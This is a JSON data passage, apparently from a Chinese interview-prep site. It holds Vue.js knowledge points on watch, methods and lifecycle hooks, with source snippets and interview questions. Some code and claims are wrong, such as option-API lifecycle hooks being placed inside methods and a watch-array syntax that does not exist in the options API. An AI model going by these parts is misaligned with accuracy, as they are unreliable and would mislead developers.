console.log('Data2 changed:', newVal);\n      }\n    }\n    ```\n- **方法二：`watch` 数组**：\n  - 通过监听数组中的多个值：\n    ```javascript\n    watch: [\n      () => this.data1,\n      () => this.data2\n    ], ([newData1, newData2]) => {\n      console.log('Data1 or Data2 changed:', newData1, newData2);\n    };\n    ```\n\n---\n\n### **6. 性能问题与优化**\n#### **问题**：\n- `watch` 是否有性能隐患？如何优化？\n- 如果需要监听大量数据或频繁变化的数据，如何避免性能问题？\n\n#### **考察点**：\n- **潜在性能隐患**：\n  - 深度监听可能导致过多的资源消耗。\n  - 频繁触发的回调函数可能影响应用性能。\n- **优化方法**：\n  - 避免不必要的深度监听。\n  - 使用节流或防抖优化回调函数：\n    ```javascript\n    watch: {\n      inputValue: _.debounce(function (newVal) {\n        console.log('Value changed:', newVal);\n      }, 300)\n    }\n    ```\n\n---\n\n### **7. 侦听器的生命周期**\n#### **问题**：\n- 侦听器何时会初始化？\n- 如何在组件销毁时取消监听？\n\n#### **考察点**：\n- **初始化**：\n  - 侦听器在组件实例化阶段初始化，除非设置了延迟绑定。\n- **销毁监听**：\n  - Vue 自动处理组件销毁时的监听器清理。\n  - 对于动态绑定的侦听器（如在 `created` 中使用 `$watch`），需要手动清理：\n    ```javascript\n    const unwatch = this.$watch('value', newVal => {\n      console.log('Value changed:', newVal);\n    });\n    // 在需要时调用 unwatch 解除监听\n    unwatch();\n    ```\n\n---\n\n### **8. 实际场景问题**\n#### **问题**：\n- 在项目中，你曾经用 `watch` 解决过哪些实际问题？\n- 是否遇到过与 `watch` 相关的性能问题？你是如何处理的？\n\n#### **考察点**：\n- **场景应用**：\n  - 表单校验：监听表单字段变化并实时校验。\n  - 动态请求：根据某个状态值变化实时发起 API 请求。\n  - 动态 UI：根据某些数据变化调整页面元素显示。\n- **性能问题及解决**：\n  - 示例：在监听复杂对象时优化监听逻辑，或通过节流/防抖减少回调触发次数。\n\n---\n\n### **开放性问题**\n- 如果同时使用 `watch` 和 `computed`，你会如何合理分配它们的职责？\n- 你认为 `watch` 的优点和局限性分别是什么？\n\n---\n\n### **总结**\n`watch` 是 Vue 中用于监听数据变化的重要工具，通过考察候选人在实际场景中对 `watch` 的理解和应用，可以评估其是否具备解决复杂逻辑问题的能力，以及是否能在项目中合理地平衡性能和功能需求。",
    "exerciseKeyList": "[\"f8de3a13-fb8b-44fd-9a8c-460a36998902\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-04T12:45:20.000Z",
    "updateAt": "2024-12-15T11:35:45.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "f8de3a13-fb8b-44fd-9a8c-460a36998902",
        "title": "​vue中computed和watch区别 ",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-20T15:13:22.000Z",
        "updateAt": "2024-08-10T17:06:20.000Z"
      }
    ]
  },
  "69": {
    "id": 69,
    "tagId": 14,
    "title": "methods",
    "explanation": "\n## Methods 的初始化\n\n在 Vue.js 中，每个组件实例（`vm`）都会有一个 `methods` 属性，这个属性包含了组件中定义的所有方法。这些方法需要被初始化到实例上，以便可以在模板和生命周期钩子中被调用。初始化过程如下：\n\n```javascript\nfunction initMethods(vm, methods) {\n    for (var key in methods) {\n        vm[key] = methods[key] == null ? noop : bind(methods[key], vm);\n    }\n}\n```\n\n这段代码遍历 `methods` 对象中的每个属性，并将其复制到 Vue 实例（`vm`）上。如果方法不存在（`methods[key] == null`），则赋值为一个空函数（`noop`），以避免对 `undefined` 的调用。否则，使用 `bind` 方法将每个方法的 `this` 绑定到 Vue 实例上。\n\n## Methods 作用域的固定\n\n在 JavaScript 中，函数的 `this` 值是在函数被调用时确定的，而不是在定义时。这可能导致在 Vue 实例的方法中 `this` 并不指向实例本身，尤其是在方法被传递给其他函数或作为回调函数时。Vue 使用 `bind` 来解决这个问题，确保 `this` 总是指向 Vue 实例。\n\n### 原生和兼容性 bind 实现\n\nVue.js 提供了两种 `bind` 的实现：原生的和兼容性的。兼容性实现是为了兼容那些不支持 `Function.prototype.bind` 的旧浏览器。\n\n```javascript\nfunction polyfillBind(fn, ctx) {\n    function boundFn(a) {\n        var l = arguments.length;\n        return l ?\n            (l > 1 ? fn.apply(ctx, arguments) : fn.call(ctx, a)) :\n            fn.call(ctx);\n    }\n    boundFn._length = fn.length;\n    return boundFn;\n}\n\nfunction nativeBind(fn, ctx) {\n    return fn.bind(ctx);\n}\n\nvar bind = Function.prototype.bind ?\n    nativeBind :\n    polyfillBind;\n```\n\n- `polyfillBind` 函数创建了一个新的函数 `boundFn`，它在调用时使用 `call` 或 `apply` 将 `fn` 的 `this` 绑定到 `ctx` 上。\n- `nativeBind` 函数直接使用原生的 `bind` 方法。\n- `bind` 变量根据浏览器是否支持原生 `bind` 来选择使用哪种实现。\n\n### 使用 bind 的好处\n\n使用 `bind` 后，我们可以在组件的方法中直接使用 `this` 来访问实例的属性和方法，而不用担心 `this` 的指向问题。这使得代码更加简洁和安全。\n\n### 示例\n\n```javascript\nnew Vue({\n    data: {\n        name: 'Kimi'\n    },\n    methods: {\n        greet: function() {\n            console.log('Hello, ' + this.name); // 使用 this 访问实例属性\n        },\n        callGreet: function() {\n            var greet = this.greet; // 保存方法引用\n            greet(); // 直接调用，this 仍然指向实例\n        }\n    }\n});\n```\n\n在这个例子中，`greet` 方法被 `bind` 绑定到 Vue 实例上，因此即使我们通过 `callGreet` 方法中的局部变量 `greet` 调用它，`this` 仍然指向 Vue 实例，而不是 `undefined` 或其他上下文。\n\n\n",
    "testPoint": "### **1. 基础知识**\n#### **问题**：\n- `methods` 的作用是什么？\n- 如何在 Vue 组件中定义和调用方法？\n\n#### **考察点**：\n- **定义**：  \n  `methods` 是一个对象，包含组件的多个方法，供模板（`template`）或 JavaScript 逻辑调用。\n- **基本语法**：\n  ```javascript\n  methods: {\n    greet() {\n      return `Hello, ${this.name}!`;\n    }\n  }\n  ```\n  - 在模板中调用：`<button @click=\"greet\">Click Me</button>`\n  - 在 JavaScript 中调用：`this.greet()`\n\n---\n\n### **2. 事件绑定**\n#### **问题**：\n- 如何在模板中绑定方法到 DOM 事件？\n- 方法如何接收事件对象？\n\n#### **考察点**：\n- **事件绑定**：\n  - 在模板中通过 `v-on` 或 `@` 绑定事件：\n    ```html\n    <button @click=\"handleClick\">Click Me</button>\n    ```\n  - 绑定方法可以直接调用，也可以传递参数：\n    ```html\n    <button @click=\"handleClick('param')\">Click Me</button>\n    ```\n- **接收事件对象**：\n  - 默认情况下，事件对象会作为方法的第一个参数传递：\n    ```javascript\n    methods: {\n      handleClick(event) {\n        console.log('Event:', event);\n      }\n    }\n    ```\n\n---\n\n### **3. 与模板和数据的关系**\n#### **问题**：\n- `methods` 中如何访问组件的 `data` 和 `props`？\n- 如果在方法中无法正确访问 `this`，可能的原因是什么？\n\n#### **考察点**：\n- **访问组件数据**：\n  - 在 `methods` 中可以通过 `this` 访问组件的 `data` 和 `props`：\n    ```javascript\n    methods: {\n      displayInfo() {\n        console.log(this.name); // 访问 data 中的 name\n        console.log(this.title); // 访问 props 中的 title\n      }\n    }\n    ```\n- **`this` 问题**：\n  - 如果 `this` 指向不正确，通常是由于方法被解构或传递给其他函数：\n    ```javascript\n    const fn = this.displayInfo; // this 会丢失\n    ```\n  - 解决方法：\n    - 使用箭头函数或手动绑定：\n      ```javascript\n      const fn = () => this.displayInfo();\n      ```\n\n---\n\n### **4. 性能和作用域**\n#### **问题**：\n- `methods` 中的方法是否会缓存？与 `computed` 属性有何不同？\n- `methods` 是否可以在子组件中直接调用？\n\n#### **考察点**：\n- **性能差异**：\n  - `methods` 中的方法是每次调用时执行，不会缓存结果。\n  - 与之对比，`computed` 的结果是基于依赖缓存的，适合复杂计算。\n- **作用域限制**：\n  - `methods` 只能在当前组件的模板中或通过 `this` 调用，不能直接从子组件调用。\n\n---\n\n### **5. 方法的用途**\n#### **问题**：\n- `methods` 应用在哪些场景？与其他 Vue 特性（如 `computed` 和 `watch`）相比，何时选择使用 `methods`？\n\n#### **考察点**：\n- **典型场景**：\n  - 处理用户交互：如按钮点击、表单提交。\n  - 业务逻辑：如计算税费、验证输入。\n  - 发起异步操作：如通过 `axios` 发送 HTTP 请求。\n- **对比**：\n  - **`methods`**：命令式逻辑，适合事件驱动的任务。\n  - **`computed`**：用于声明式计算，适合依赖数据的派生值。\n  - **`watch`**：监听数据变化并触发副作用。\n\n---\n\n### **6. 方法的参数和返回值**\n#### **问题**：\n- 如何向方法传递多个参数？\n- 如果方法需要返回值，该如何处理？\n\n#### **考察点**：\n- **多参数传递**：\n  - 在模板中通过括号传递多个参数：\n    ```html\n    <button @click=\"calculate(10, 20)\">Calculate</button>\n    ```\n  - 方法定义：\n    ```javascript\n    methods: {\n      calculate(a, b) {\n        return a + b;\n      }\n    }\n    ```\n- **返回值**：\n  - 方法可以返回任意值，但在模板中使用时仅支持表达式：\n    ```html\n    <div>{{ calculate(10, 20) }}</div>\n    ```\n\n---\n\n### **7. 方法的异步操作**\n#### **问题**：\n- 如何在 `methods` 中处理异步任务？\n- `methods` 中的异步逻辑是否会影响组件生命周期？\n\n#### **考察点**：\n- **处理异步任务**：\n  - 可以使用 `async/await` 处理异步任务：\n    ```javascript\n    methods: {\n      async fetchData() {\n        const data = await axios.get('/api/data');\n        this.items = data;\n      }\n    }\n    ```\n  - 在模板中调用异步方法：\n    ```html\n    <button @click=\"fetchData\">Fetch Data</button>\n    ```\n- **生命周期影响**：\n  - 异步操作不会阻塞组件生命周期，但需注意在组件销毁后不再更新状态以防止报错。\n\n---\n\n### **8. 方法的测试与调试**\n#### **问题**：\n- 如何测试和调试 `methods`？\n- `methods` 中的复杂逻辑应该如何重构？\n\n#### **考察点**：\n- **测试方法**：\n  - 独立测试逻辑：\n    ```javascript\n    expect(component.methods.calculate(2, 3)).toBe(5);\n    ```\n  - 使用 Vue 的测试工具（如 Vue Test Utils）测试交互行为。\n- **重构建议**：\n  - 将复杂逻辑提取到工具函数中，以便复用和测试。\n\n---\n\n### **9. 生命周期和 `methods`**\n#### **问题**：\n- `methods` 和生命周期钩子如何协同工作？\n- 在哪些生命周期钩子中调用 `methods` 更为合理？\n\n#### **考察点**：\n- **协同使用**：\n  - `methods` 可以在生命周期钩子中调用，以便初始化数据或设置组件状态：\n    ```javascript\n    mounted() {\n      this.fetchData();\n    }\n    ```\n- **适用钩子**：\n  - `created`：适合不依赖 DOM 的初始化逻辑。\n  - `mounted`：适合需要访问 DOM 的任务。\n\n---\n\n### **10. 实际场景问题**\n#### **问题**：\n- 项目中你是如何设计和组织 `methods` 的？\n- 是否遇到过 `methods` 中的性能或维护问题？如何优化？\n\n#### **考察点**：\n- **方法组织**：\n  - 将通用逻辑抽离为工具函数。\n  - 按功能分类 `methods`，保持结构清晰。\n- **性能优化**：\n  - 避免在方法中处理复杂的同步计算。\n  - 使用防抖或节流优化频繁触发的方法。\n\n---\n\n### **开放性问题**\n- 在实际项目中，`methods` 与 Vue 其他特性（如 `computed`、`watch`）如何配合使用？\n- 你认为 `methods` 有哪些局限性？如何弥补？\n\n---\n\n### **总结**\n对 Vue 的 `methods` 的考察，旨在了解候选人是否熟悉 Vue 中方法的定义和使用，能否灵活应对用户交互、复杂业务逻辑，以及是否具备性能优化和代码组织的能力。",
    "exerciseKeyList": "[]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-04T12:55:37.000Z",
    "updateAt": "2024-12-15T11:41:35.000Z",
    "$progressExercise": "",
    "$exerciseList": []
  },
  "70": {
    "id": 70,
    "tagId": 14,
    "title": "生命周期",
    "explanation": "\n\nvue3生命周期\n========\n\n在Vue中，生命周期指的是Vue实例从创建到销毁的过程。在这个过程中，Vue实例会经历一系列的阶段，包括数据观测、模板编译、挂载DOM、更新DOM、卸载等等。在这些阶段，Vue提供了一些生命周期钩子函数，让我们可以在特定的时机执行某些代码。\n\n为什么需要生命周期\n---------\n\n生命周期钩子函数为我们提供了在Vue实例生命周期不同阶段执行代码的能力。这对于非响应式的操作非常有用，例如直接操作DOM、添加事件监听器或者创建定时器等。这些操作如果在数据变化时执行可能会导致不必要的性能开销，而生命周期钩子函数让我们可以更合理地安排这些操作的执行时机。一些常用的库，例如`react`，`webpack`都提供了生命周期的钩子，方便开发者理解整个运行流程。\n\nVue3 有哪些生命周期，分别在什么时候调用？\n-----------------------\n\nVue3的生命周期钩子函数主要包括：\n\n*   `beforeCreate`: 创建实例之前调用，此时实例的数据观测、事件等还未初始化。\n*   `created`: 创建实例后调用，此时实例的数据观测、事件等已经初始化完成。\n*   `beforeMount`: 挂载实例之前调用，此时模板已经编译完成，但是还未挂载到DOM。\n*   `mounted`: 挂载实例后调用，此时实例已经挂载到DOM，可以进行DOM操作。\n*   `beforeUpdate`: 数据更新之前调用，此时可以进行状态的最后更改。\n*   `updated`: 数据更新后调用，此时DOM已经完成更新，可以进行DOM操作。\n*   `beforeUnmount`: 卸载实例之前调用，此时实例仍然完全可用。\n*   `unmounted`: 卸载实例后调用，此时实例已经完全卸载。\n\n生命周期类型的枚举位于`packages/runtime-core/src/enums.ts`目录下：\n\n```javascript\nexport const enum LifecycleHooks {\n  BEFORE_CREATE = 'bc', // 创建之前\n  CREATED = 'c', // 创建\n  BEFORE_MOUNT = 'bm', // 挂载之前\n  MOUNTED = 'm', // 挂载\n  BEFORE_UPDATE = 'bu', // 更新之前\n  UPDATED = 'u', // 更新\n  BEFORE_UNMOUNT = 'bum', // 卸载之前\n  UNMOUNTED = 'um', // 卸载之后\n  DEACTIVATED = 'da', // 被 keep-alive 缓存的组件停用时调用。\n  ACTIVATED = 'a', // 被 keep-alive 缓存的组件激活时调用。\n  RENDER_TRIGGERED = 'rtg', // 依赖被收集时调用\n  RENDER_TRACKED = 'rtc', // 依赖被触发时调用\n  ERROR_CAPTURED = 'ec', // 错误捕获\n  SERVER_PREFETCH = 'sp'\n}\n\n```\n\n上面生命周期可以用一张图来表示：\n\n![image-20240111204111221.png](https://static.ecool.fun//article/61d05e65-59d3-44a1-9cae-73799fb3d816.)\n\n选项式和组合式生命周期的区别\n--------------\n\n在Vue3中，我们可以使用选项式API和组合式API来定义组件。这两种API对应的生命周期钩子函数有一些区别。\n\n*   选项式API的生命周期钩子函数定义在组件选项对象的methods中，例如：\n\n```\nexport default {\n  methods: {\n    created() {\n      // do something\n    }\n  }\n}\n\n```\n\n*   组合式API的生命周期钩子函数定义在`setup`函数中，需要使用`import`从`vue`中引入，例如：\n\n```\nimport { onMounted } from 'vue';\n​\nexport default {\n  setup() {\n    onMounted(() => {\n      // do something\n    });\n  }\n}\n\n```\n\n需要注意的是，在组合式API中没有`beforecate`和`created`钩子，因为他们本身被`setup`这个函数替代了，直接把相关逻辑写在`setup`中就行了\n\n父子组件生命周期的执行顺序\n-------------\n\n父子组件生命周期的执行顺序是在父子组件的执行顺序下通过调度算法按`Vue`的规则进行执行的。首先父组件先实例化进行执行，通过上面的生命周期的调用说明，我们可以知道，先执行父组件的`beforeMount`，然后去获取父组件的虚拟DOM，然后在`patch`的过程中遇到虚拟节点是组件类型的时候，就又会去走组件初始化的流程，这个时候其实就是子组件初始化，那么之后子组件也需要走一遍组件的所有流程，子组件在第一次渲染的时候，先执行子组件的`beforeMount`，再去获取子组件的虚拟DOM，然后`patch`子组件的虚拟DOM，如果过程中又遇到节点是组件类型的话，又去走一遍组件初始化的流程，直到子组件patch完成，然后执行子组件的mounted生命周期函数，接着回到父组件的执行栈，执行父组件的`mounted`生命周期。\n\n所以在初始化创建的时候，是深度递归创建子组件的过程，父子组件的生命周期的执行顺序是：\n\n1.  父组件 -> `beforeMount`\n2.  子组件 ->`beforeMount`\n3.  子组件 -> `mounted`\n4.  父组件 -> `mounted`\n\n**父子组件更新顺序同样是深度递归执行的过程：**\n\n因为如果父子组件存在通过props传递数据的话，就必须先更新父组件，才能更新子组件。因为子组件自己是没办法拿到最新的`props`的，必须通过父组件传递进去。同时如果父组件有一些通过`ref`操作子组件DOM的操作，就需要保证子组件的已经更新完成。\n\n在组件更新的源码中有这么一段，如果有`next`表示是父组件更新引起的更新，这个时候需要调用`updateComponentPreRender`进行子组件数据的更新。所以我们父组件一定要在子组件之前调用`breforeUpdate`。\n\n```javascript\nif (next) {\n    next.el = vnode.el\n    // 在组件更新前，先更新一些数据\n    updateComponentPreRender(instance, next, optimized)\n} else {\n    next = vnode\n}\n\n```\n\n例如更新props,更新slots\n\n```javascript\nconst updateComponentPreRender = (\n    instance: ComponentInternalInstance,\n    nextVNode: VNode,\n    optimized: boolean\n  ) => {\n    nextVNode.component = instance\n    const prevProps = instance.vnode.props\n    instance.vnode = nextVNode\n    instance.next = null\n    // 更新props\n    updateProps(instance, nextVNode.props, prevProps, optimized)\n    // 更新slots\n    updateSlots(instance, nextVNode.children, optimized)\n  // ...\n  }\n\n```\n\n所以在父子组件更新的时候，父子组件的生命周期执行顺序是：\n\n1.  父组件 ->`beforeUpdate`\n2.  子组件 -> `beforeUpdate`\n3.  子组件 -> `updated`\n4.  父组件 ->`updated`\n\n同样卸载的时候父子组件也是深度递归遍历执行的过程：\n\n1.  父组件 -> `beforeUnmount`\n2.  子组件 -> `beforeUnmount`\n3.  子组件 -> `unmounted`\n4.  父组件 -> `unmounted`\n\n理解父子组件生命周期的调用流程需要我们对`Vue`的渲染过程有清晰的认知。因为`Vue`渲染是一个自定向下逐步递归的过程。\n\n使用生命周期的一些注意事项\n-------------\n\n*   生命周期钩子函数的`this`上下文指向调用它的Vue实例。在箭头函数中不可用，因为箭头函数绑定了父级作用域的上下文。\n*   `setup`函数是唯一可以使用组合式API生命周期钩子函数的地方，其他地方使用会导致运行时错误。但是不是一定要卸载setup函数中，如果和`setup`函数是同一个执行上下文也是可以的。\n*   生命周期钩子函数的执行顺序是：`beforeCreate` -> `created` -> `beforeMount` -> `mounted` -> `beforeUpdate` -> `updated` -> `beforeUnmount` -> `unmounted`。\n\n源码-生命周期的注册\n----------\n\n```javascript\n// 生命周期的创建\nexport const onBeforeMount = createHook(LifecycleHooks.BEFORE_MOUNT)\nexport const onMounted = createHook(LifecycleHooks.MOUNTED)\nexport const onBeforeUpdate = createHook(LifecycleHooks.BEFORE_UPDATE)\nexport const onUpdated = createHook(LifecycleHooks.UPDATED)\nexport const onBeforeUnmount = createHook(LifecycleHooks.BEFORE_UNMOUNT)\nexport const onUnmounted = createHook(LifecycleHooks.UNMOUNTED)\nexport const onServerPrefetch = createHook(LifecycleHooks.SERVER_PREFETCH)\n\n```\n\n可以看到各个生命周期的`Hooks`函数是通过`createHook`这个函数创建的。我们在`setup`函数中使用的也就是我们通过`createHook`创建之后的函数\n\n```\n// packages/runtime-core/src/apiLifecycle.ts\nexport const createHook = (lifecycle) => (hook, target = currentInstance) => injectHook(lifecycle, hook, target)\n\n```\n\n`createHook`是一个闭包函数，通过闭包缓存当前是属于哪个生命周期的`hooks`。`target`表示该生命周期`hooks`函数被绑定到哪个组件实例上，默认是当前工作的组件实例。后续我们执行生命周期的时候就需要从绑定的实例上获取当前`hooks`的执行函数执行。`createHook`底层又调用了一个`injectHook`的函数，那么下面我们继续来看看这个`injectHook`函数。\n\n```javascript\nexport function injectHook(\n  type: LifecycleHooks, // 我们调用createHook传入的值\n  hook: Function & { __weh?: Function }, // hook执行函数\n  target: ComponentInternalInstance | null = currentInstance, // 目标实例\n  prepend: boolean = false\n): Function | undefined {\n  if (target) {\n    // 把各个生命周期的Hooks函数挂载到组件实例上，并且是一个数组，因为可能你会多次调用同一个组件的同一个生命周期函数\n    const hooks = target[type] || (target[type] = [])\n    const wrappedHook =\n      hook.__weh ||\n      (hook.__weh = (...args: unknown[]) => {\n        if (target.isUnmounted) { // 组件卸载了就不执行\n          return\n        }\n        pauseTracking() // 生命周期函数的执行不需要收集响应式依赖，我们只需要在render渲染的时候收集就好了。因为我们依赖的触发响应式变化最后是要修改dom的\n        setCurrentInstance(target) // 设置当前实例\n        const res = callWithAsyncErrorHandling(hook, target, type, args) // 运行当前hooks\n        unsetCurrentInstance()\n        resetTracking() // 恢复依赖收集\n        return res\n      })\n    if (prepend) {\n      hooks.unshift(wrappedHook) // 把生命周期的包装函数绑定到组件实例对应的hooks上\n    } else {\n      hooks.push(wrappedHook)\n    }\n    return wrappedHook\n  }\n}\n\n```\n\n`injectHook`函数其实就是把我们传递给`onMounted`或者其他生命周期钩子的函数进行包裹生成新的`wrappedHook`函数。然后将生成的函数绑定到对应实例对应的`hooks`上面，供后续调用。所以其实我们我们调用的时候都是调用的`wrappedHook`函数。\n\n另外我们注意到钩子函数运行的时候是停止依赖收集了的。这是因为**依赖的收集只需要在调用**`render`**函数的时候完成即可**，**对于模板没有用到的变量不需要进行**`DOM`**更新**。所以在生命周期钩子内部收集依赖是**没有必要**的。\n\n**选项式和组合式生命周期的注册**\n\n在组合式中，我们调用的例如`onMounted`其实就是我们通过`createHook`注册之后返回的函数。所以调用`onMounted`实际上就是调用`createHook`返回的`injectHook`函数。\n\n```javascript\n// 组合 API\n<script>\nimport { onMounted } from 'vue'\n​\nexport default {\n   setup () {\n     onMounted(() => {\n       console.log('mounted in the composition api!')\n     })\n   }\n}\n</script>\n\n```\n\n在选项式中，我们通过如下方式调用生命周期函数。\n\n```javascript\n// 选项 API\n<script>     \n   export default {         \n      mounted() {             \n         console.log('mounted!')         \n      },         \n      updated() {             \n         console.log('updated!')         \n      }     \n   }\n</script> \n\n```\n\n那么我们是何时注册到组件实例上的呢。还记得我们在组件初始化的时候会调用`applyOptions`嘛。生命周期函数的注册也是在这个函数里面完成的。\n\n```javascript\nexport function applyOptions() { // 省略参数\n  // 省略其他代码\n  registerLifecycleHook(onBeforeMount, beforeMount) // 注册生命周期钩子函数\n  registerLifecycleHook(onMounted, mounted)\n  registerLifecycleHook(onBeforeUpdate, beforeUpdate)\n  registerLifecycleHook(onUpdated, updated)\n  registerLifecycleHook(onActivated, activated)\n  registerLifecycleHook(onDeactivated, deactivated)\n  registerLifecycleHook(onErrorCaptured, errorCaptured)\n  registerLifecycleHook(onRenderTracked, renderTracked)\n  registerLifecycleHook(onRenderTriggered, renderTriggered)\n  registerLifecycleHook(onBeforeUnmount, beforeUnmount)\n  registerLifecycleHook(onUnmounted, unmounted)Ï\n  registerLifecycleHook(onServerPrefetch, serverPrefetch)\n  // 省略其他代码\n}\n\n```\n\n我们会调用`registerLifecycleHook`进行生命周期的注册。第一个参数是注册函数，也就是我们通过`createHook`创建的函数。第二个参数就是用户通过选项式编写的生命周期函数。\n\n```javascript\nfunction registerLifecycleHook(\n    register: Function,\n    hook?: Function | Function[]\n  ) {\n    if (isArray(hook)) {\n      hook.forEach(_hook => register(_hook.bind(publicThis)))\n    } else if (hook) {\n      register(hook.bind(publicThis))\n    }\n  }\n\n```\n\n所以我们可以看到生命周期的注册主要还`injectHook`这个函数的执行。\n\n源码-生命周期的调用\n----------\n\n生命周期的函数发生在组件创建，挂载，更新和卸载阶段。我们来分别看看这几个阶段中生命周期如何被调用\n\n### 创建\n\n在组件创建的过程中，我们主要执行`beforeCreate`和`created`函数。对于选项式写法来说就是在`applyOptions`中执行。注意：再次强调对于组合式写法来说没有这两个钩子函数，因为`setup`的执行就代替了这两个生命周期函数\n\n```javascript\nexport function applyOptions() { // 省略参数\n  // 省略其他代码\n  if (options.beforeCreate) { // 调用beforeCreate\n    callHook(options.beforeCreate, instance, LifecycleHooks.BEFORE_CREATE)\n  }\n  // 省略其他代码\n  if (created) { // created操作\n    callHook(created, instance, LifecycleHooks.CREATED)\n  }\n  // 省略其他代码\n}\n\n```\n\n可以看到`beforeCreate`在我们初始化最开始调用。`created`在我们完成了基本的初始化例如`watch,computed`处理再进行调用。这个时候在页面上是看不到我们的`dom`的。\n\n生命周期钩子函数是通过调用`callHook`函数实现的。`callHook`函数接收两个参数：Vue实例和生命周期钩子函数的名称。在函数内部，首先从Vue实例的`$options`中获取对应的生命周期钩子函数数组，然后遍历这个数组，依次执行每个生命周期钩子函数。\n\n```javascript\nfunction callHook(\n  hook: Function,\n  instance: ComponentInternalInstance,\n  type: LifecycleHooks\n) {\n  callWithAsyncErrorHandling(\n    isArray(hook)\n      ? hook.map(h => h.bind(instance.proxy!)) // 遍历执行当前的hooks\n      : hook.bind(instance.proxy!), // 在这里绑定上instance.proxy的实例，这样可以通过this访问到data，props这些属性的值了\n    instance,\n    type\n  )\n}\n\n```\n\n### 挂载\n\n组件的挂载发生在第一次`patch`过程中，如果遇到了组件类型就会调用`mountComponent`函数进行组件的挂载。然后会调用`setupRenderEffect`创建副作用函数，最后会去执行`componentUpdateFn`进行组件的挂载，我们挂载的生命周期也是在这个函数中进行调用的。\n\n```javascript\nconst componentUpdateFn = () => { // 省略参数\n  if (!instance.isMounted) { // 初次挂载\n    const { bm, m, parent } = instance\n    if (bm) { // 触发beforemount钩子函数\n      invokeArrayFns(bm) // invokeArrayFns在执行beforeMount的时候包裹一层try catch,因为beforeMount是用户写的代码可能出    现错误,为了保证程序能继续运行下去所以需要一层保护机制。\n    }\n​\n    //省略其他代码\n    const subTree = (instance.subTree = renderComponentRoot(instance)) // 递归调用子组件获取最终的vnode 通过执行模板编译后生成的render函数，再进行相应的处理，得到最终的vnode。\n​\n    // 子树patch\n​\n    // mounted hook // 触发mounted钩子函数,放在后置队列执行，因为mounted要在组件渲染之后执行\n    if (m) {\n      queuePostRenderEffect(m, parentSuspense)\n    }\n  } else {\n    // 更新逻辑\n  }\n}\n\n```\n\n可以看到在渲染刚开始我们就会调用`beforemount`，这个执行是同步的。然后我们会执行子组件的挂载操作。等子组件处理完了我们就会调用`mounted`。从这里我们也能看出父子组件的执行顺序和父子组件生命周期函数的执行顺序了。\n\n> 注意`mounted`的调用是异步的，我们会将`mounted`通过`queuePostRenderEffect`放入调度器的后置队列执行。因为我们在`mounted`的时候可能去访问DOM节点，所以必须保证我们执行`mounted`的时候DOM已经挂载完了。而DOM的挂载是通过`queueJob`放置的普通任务。所以将`mounted`放入后置队列可以保证DOM一定挂载完成\n\n### 更新\n\n组件的更新发生在响应式数据变更后。响应式数据的变更会触发我们注册的副作用函数，最后也会调用到 `componentUpdateFn`走更新逻辑。\n\n```javascript\nconst componentUpdateFn = () => { // 省略参数\n  if (!instance.isMounted) { // 初次挂载\n    // 挂载逻辑\n  } else {\n    // 更新逻辑\n    let { next, bu, u, parent, vnode } = instance\n     //省略其他代码\n    // beforeUpdate hook // 触发beforeUpdate钩子函数\n    if (bu) {\n      invokeArrayFns(bu)\n    }\n    const nextTree = renderComponentRoot(instance) // 重新渲染子树，调用一下render函数，生成新的vnode\n    // 子树patch\n    \n    // updated hook // 触发updated钩子函数,放在后置队列执行\n    if (u) {\n      queuePostRenderEffect(u, parentSuspense)\n    }\n  }\n}\n\n```\n\n更新流程中生命周期函数的调用和挂载类似。也是从父组件的`beforeUpdate`开始，最后到父组件的`updated`结束。\n\n> 同理，这里的`updated`也需要在后置队列中执行\n\n### 卸载\n\n组件卸载发生的时机可以先看我的[组件卸载](https://juejin.cn/blogs/unmount/index \"/blogs/unmount/index\")这篇文章。卸载过程最后会调用`unmountComponent`进行组件的卸载\n\n```javascript\nconst unmountComponent = (\n    instance: ComponentInternalInstance,\n    parentSuspense: SuspenseBoundary | null,\n    doRemove?: boolean\n  ) => {\n    //省略其他代码\n    const { bum, scope, update, subTree, um } = instance\n    // beforeUnmount hook // 调用 beforeUnmount狗子\n    if (bum) {\n      invokeArrayFns(bum)\n    }\n    // 组件卸载\n    // unmounted hook // 调用unmounted钩子\n    if (um) {\n      queuePostRenderEffect(um, parentSuspense)\n    }\n  }\n\n```\n\n组件卸载的生命周期的调用也挺直观的就不过多赘述。\n\n> 同理，这里的`unmounted`也需要在后置队列中执行\n\n总结\n--\n\n感觉`vue3`中生命周期`hooks`的功能和`react hooks`很类似，`react hooks`的本质就是把状态变量、副作用函数存到函数组件的fiber对象上，等到将来状态变量发生改变的时候，相关的函数组件fiber就重新进行更新。Vue3这边的实现原理也类似，通过上面的生命周期的`hooks`实现原理，我们可以知道`Vue3`的生命周期的`Hooks`是绑定到具体的组件实例上。\n\n总之，Vue3的生命周期钩子函数是一个非常强大的特性，它让我们可以在Vue实例的生命周期中的特定时机执行代码。通过了解生命周期钩子函数的原理，我们可以更好地理解Vue的运行机制，编写更高效、更健壮的代码。在Vue3中，我们可以使用选项式API和组合式API来定义组件，这两种API对应的生命周期钩子函数有一些使用上的区别。在实际开发中，我们需要根据实际需求选择合适的API来定义组件。\n\n  \n\n",
    "testPoint": "### **1. 生命周期的基础知识**\n#### **问题**：\n1. 什么是 Vue 的生命周期？  \n2. Vue 的生命周期钩子有哪些？各自的作用是什么？\n\n#### **考察点**：\n- Vue 实例在其生命周期内会经历一系列初始化、渲染、更新、销毁的过程，每个阶段都有相应的钩子函数供开发者操作。\n- 生命周期钩子按照顺序：\n  - **创建阶段**：`beforeCreate`、`created`\n  - **挂载阶段**：`beforeMount`、`mounted`\n  - **更新阶段**：`beforeUpdate`、`updated`\n  - **销毁阶段**：`beforeDestroy`、`destroyed`\n  - **特定场景**：`activated`、`deactivated`（仅适用于 `<keep-alive>` 缓存组件）\n\n---\n\n### **2. 各生命周期钩子的作用**\n#### **问题**：\n1. `created` 和 `mounted` 有什么区别？  \n2. 更新相关钩子（如 `beforeUpdate` 和 `updated`）的适用场景是什么？\n\n#### **考察点**：\n- **创建阶段**：\n  - `beforeCreate`：Vue 实例刚初始化，还未设置 `data`、`methods` 等，`this` 上无可用数据。\n  - `created`：实例已完成初始化，`data`、`methods` 可用，但未挂载 DOM。\n- **挂载阶段**：\n  - `beforeMount`：模板编译完成，但 DOM 尚未插入。\n  - `mounted`：模板已渲染并插入 DOM，适合操作 